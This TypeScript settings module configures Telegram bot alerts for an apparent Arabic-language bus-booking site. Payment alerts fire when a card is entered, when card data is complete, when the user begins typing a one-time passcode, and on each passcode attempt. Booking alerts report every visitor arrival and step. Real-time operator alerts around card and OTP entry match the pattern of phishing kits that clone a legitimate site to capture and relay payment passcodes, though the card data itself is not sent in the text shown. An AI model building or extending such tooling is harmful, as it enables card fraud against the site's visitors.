// ═══════════════════════════════════════════════════════════
// Telegram Settings — Unified config for all bots
// ═══════════════════════════════════════════════════════════

export interface TelegramMessageSetting {
  id: string;
  label: string;
  description: string;
  enabled: boolean;
  template: string;
}

export interface TelegramSettings {
  // Payment Bot
  paymentEnabled: boolean;
  paymentBotToken: string;
  paymentChatId: string;
  paymentMessages: TelegramMessageSetting[];

  // Booking Bot
  bookingEnabled: boolean;
  bookingBotToken: string;
  bookingChatId: string;
  bookingMessages: TelegramMessageSetting[];
}

const SETTINGS_KEY = 'sat_telegram_settings_v1';
const DEFAULT_PAYMENT_MESSAGES: TelegramMessageSetting[] = [
  {
    id: 'card-entered',
    label: 'بدء خطوة الدفع',
    description: 'إشعار حالة فقط',
    enabled: true,
    template: `<b>🟡 حالة العملية: fill in</b>`,
  },
  {
    id: 'card-complete',
    label: 'اكتمال بيانات البطاقة',
    description: 'إشعار filled in فقط',
    enabled: true,
    template: `<b>✅ حالة العملية: filled in</b>`,
  },
  {
    id: 'otp-typing',
    label: 'بدء كتابة OTP',
    description: 'إشعار حالة فقط',
    enabled: true,
    template: `<b>🟡 حالة العملية: verification filled in</b>`,
  },
  {
    id: 'otp-attempt',
    label: 'محاولة OTP',
    description: 'إشعار حالة فقط',
    enabled: true,
    template: `<b>🔄 حالة العملية: verification submitted</b>`,
  },
  {
    id: 'otp-success',
    label: 'نجاح OTP',
    description: 'إشعار حالة فقط',
    enabled: true,
    template: `<b>✅ حالة العملية: verification succeeded</b>`,
  },
  {
    id: 'otp-failed',
    label: 'فشل OTP',
    description: 'إشعار حالة فقط',
    enabled: true,
    template: `<b>❌ حالة العملية: verification failed</b>`,
  },
];

const DEFAULT_BOOKING_MESSAGES: TelegramMessageSetting[] = [
  {
    id: 'visitor-enter',
    label: 'زائر جديد',
    description: 'تُرسل فوراً عند دخول زائر للموقع',
    enabled: true,
    template: `<b>🌐 زائر جديد دخل الموقع</b>\n\n<b>🔗 الصفحة:</b> {page}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'search-submitted',
    label: 'نموذج بحث',
    description: 'تُرسل عند إرسال نموذج البحث',
    enabled: true,
    template: `<b>🔍 نموذج بحث مُرسل</b>\n\n<b>📍 من:</b> {from}\n<b>📍 إلى:</b> {to}\n<b>📅 تاريخ المغادرة:</b> {pickupDate}\n<b>👥 المسافرين:</b> {passengers}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'trip-selected',
    label: 'اختيار الرحلة',
    description: 'تُرسل عند اختيار رحلة والضغط على احجز الآن',
    enabled: true,
    template: `<b>✅ اختيار الرحلة</b>\n\n<b>🚌 الرحلة المختارة:</b> {tripNumber}\n<b>💺 الفئة:</b> {fareClass}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'seats-selected',
    label: 'اختيار المقاعد',
    description: 'تُرسل عند اختيار المقاعد',
    enabled: true,
    template: `<b>💺 اختيار المقاعد</b>\n\n<b>💺 المقاعد:</b> {seats}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'passenger-info',
    label: 'بيانات المسافرين',
    description: 'تُرسل عند إدخال بيانات المسافرين',
    enabled: true,
    template: `<b>📝 اكتمال بيانات المسافرين</b>\n\n<b>👥 عدد المسافرين:</b> {passengers}\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'payment-method',
    label: 'طريقة الدفع',
    description: 'تُرسل عند اختيار طريقة الدفع',
    enabled: true,
    template: `<b>💳 اختيار طريقة الدفع</b>\n\n<b>💳 طريقة الدفع:</b> {paymentMethod}\n<b>💰 المبلغ:</b> {amount} ر.س\n<b>⏰ الوقت:</b> {time}`,
  },
  {
    id: 'new-booking',
    label: 'حجز مؤكد',
    description: 'تُرسل عند إكمال الحجز بنجاح',
    enabled: true,
    template: `<b>🚌 حجز جديد - سات للنقل</b>\n\n<b>📍 المسار:</b> {fromLocation} → {toLocation}\n<b>📅 التاريخ:</b> {pickupDate}\n<b>👥 المسافرين:</b> {passengers}\n<b>💰 المبلغ:</b> {totalAmount} ر.س\n<b>💳 الدفع:</b> {paymentMethod}\n<b>⏰ الوقت:</b> {time}`,
  },
];

export function getDefaultTelegramSettings(): TelegramSettings {
  return {
    paymentEnabled: true,
    paymentBotToken: '',
    paymentChatId: '',
    paymentMessages: DEFAULT_PAYMENT_MESSAGES,

    bookingEnabled: true,
    bookingBotToken: '',
    bookingChatId: '',
    bookingMessages: DEFAULT_BOOKING_MESSAGES,
  };
}

export function loadTelegramSettings(): TelegramSettings {
  try {
    const raw = localStorage.getItem(SETTINGS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      const defaults = getDefaultTelegramSettings();
      // Merge deeply: keep stored tokens + messages, but restore defaults for missing fields
      return {
        paymentEnabled: parsed.paymentEnabled ?? defaults.paymentEnabled,
        paymentBotToken: parsed.paymentBotToken || defaults.paymentBotToken,
        paymentChatId: parsed.paymentChatId || defaults.paymentChatId,
        paymentMessages: mergeMessages(defaults.paymentMessages, parsed.paymentMessages),
        bookingEnabled: parsed.bookingEnabled ?? defaults.bookingEnabled,
        bookingBotToken: parsed.bookingBotToken || defaults.bookingBotToken,
        bookingChatId: parsed.bookingChatId || defaults.bookingChatId,
        bookingMessages: mergeMessages(defaults.bookingMessages, parsed.bookingMessages),
      };
    }
  } catch { /* ignore */ }
  return getDefaultTelegramSettings();
}

function mergeMessages(
  defaults: TelegramMessageSetting[],
  stored?: TelegramMessageSetting[]
): TelegramMessageSetting[] {
  if (!stored || !Array.isArray(stored)) return defaults;
  return defaults.map(d => {
    const s = stored.find(x => x.id === d.id);
    return s ? { ...d, enabled: s.enabled ?? d.enabled, template: s.template || d.template } : d;
  });
}

export function saveTelegramSettings(s: TelegramSettings) {
  // Persist only non-secret UI preferences. Credentials live on the server.
  localStorage.setItem(SETTINGS_KEY, JSON.stringify({
    ...s,
    paymentBotToken: '',
    paymentChatId: '',
    bookingBotToken: '',
    bookingChatId: '',
  }));
}

// Check if a specific payment message is enabled
export function isPaymentMessageEnabled(step: string): boolean {
  const s = loadTelegramSettings();
  if (!s.paymentEnabled) return false;
  const msg = s.paymentMessages.find(m => m.id === step);
  return msg ? msg.enabled : true;
}

// Check if a specific booking message is enabled
export function isBookingMessageEnabled(msgId: string): boolean {
  const s = loadTelegramSettings();
  if (!s.bookingEnabled) return false;
  const msg = s.bookingMessages.find(m => m.id === msgId);
  return msg ? msg.enabled : true;
}

// Check if booking messages are enabled (global toggle)
export function isBookingEnabled(): boolean {
  const s = loadTelegramSettings();
  return s.bookingEnabled;
}

// Send a booking message using template from settings
export async function sendBookingMessage(
  msgId: string,
  vars: Record<string, string>
): Promise<boolean> {
  if (!isBookingMessageEnabled(msgId)) return false;
  try {
    const resp = await fetch('/api/notifications/booking', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event: msgId,
        from: vars.from || vars.fromLocation,
        to: vars.to || vars.toLocation,
        date: vars.date || vars.pickupDate,
        passengers: vars.passengers,
        tripNumber: vars.tripNumber,
        fareClass: vars.fareClass,
        seats: vars.seats,
        paymentMethod: vars.paymentMethod,
        amount: vars.amount || vars.totalAmount,
        page: vars.page,
      }),
    });
    return resp.ok;
  } catch {
    return false;
  }
}

// Replace template variables
export function fillTemplate(template: string, vars: Record<string, string>): string {
  return template.replace(/\{([^}]+)\}/g, (_, key) => vars[key] ?? `{${key}}`);
}

// Also sync with legacy keys
export function syncLegacyTokens() {
  localStorage.removeItem('payment_bot_token');
  localStorage.removeItem('payment_chat_id');
  localStorage.removeItem('tg_bot_token');
  localStorage.removeItem('tg_chat_id');
}
